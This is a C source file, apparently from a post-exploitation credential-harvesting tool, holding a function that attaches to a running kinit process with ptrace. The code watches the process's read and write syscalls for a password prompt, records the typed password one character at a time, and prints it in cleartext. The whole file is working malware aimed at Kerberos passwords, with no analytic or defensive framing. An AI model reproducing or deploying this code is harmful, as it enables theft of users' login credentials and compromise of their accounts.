#include <bits/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/reg.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

#include "config.h"
#include "helpers.h"
#include "tracers.h"

#define PASS_PROMPT ": "

extern pid_t process_pid;
extern char *process_name;
extern char *process_path;
extern char *process_username;

void intercept_kinit(pid_t traced_process) {
  int status = 0;
  int syscall = 0;
  int i = 0;
  long length = 0;
  char *read_string = NULL;
  char *write_string = NULL;
  int pass_prompt = 0;
  char *prompt_str = NULL;
  char *password = NULL;
  struct user_regs_struct regs;

  password = (char *)calloc(sizeof(char) * MAX_PASSWORD_LEN + 1, 1);

  if (!password)
    goto exit_kinit;

  memset(&regs, 0, sizeof(regs));
  ptrace(PTRACE_ATTACH, traced_process, NULL, &regs);
  waitpid(traced_process, &status, 0);

  if (!WIFSTOPPED(status))
    goto exit_kinit;

  ptrace(PTRACE_SETOPTIONS, traced_process, 0, PTRACE_O_TRACESYSGOOD);
  while (1) {
    if (wait_for_syscall(traced_process) != 0)
      break;

    syscall = get_syscall(traced_process);

    if (syscall == SYSCALL_read && pass_prompt) {
      length = get_syscall_arg(traced_process, 2);

      if (length == 1) {
        // Concatenate password/passphrase one char at a time
        read_string = extract_read_string(traced_process, length);
        if (read_string[0] && i < MAX_PASSWORD_LEN) {
          password[i++] = read_string[0];
        }
        free(read_string);
        read_string = NULL;
      }
    } else if (syscall == SYSCALL_write) {
      length = get_syscall_arg(traced_process, 2);
      write_string = extract_write_string(traced_process, length);

      if (length == 1) {
        // User has entered password/passphrase and pressed 'enter'
        if (write_string[0] == '\n' && pass_prompt) {
          output("%s\n", password);
          pass_prompt = 0;
          memset(password, 0, MAX_PASSWORD_LEN);
          i = 0;
        }
      } else {
        // Check if password or passphrase prompt is encountered
        prompt_str = strstr(write_string, PASS_PROMPT);
        if (prompt_str && strlen(prompt_str) == strlen(PASS_PROMPT)) {
          pass_prompt = 1;
        }
      }

      free(write_string);
      write_string = NULL;
    }
    if (wait_for_syscall(traced_process) != 0)
      break;
  }

exit_kinit:
  free(password);
  free_process_name();
  free_process_username();
  free_process_path();
  ptrace(PTRACE_DETACH, traced_process, NULL, NULL);
  exit(0);
}
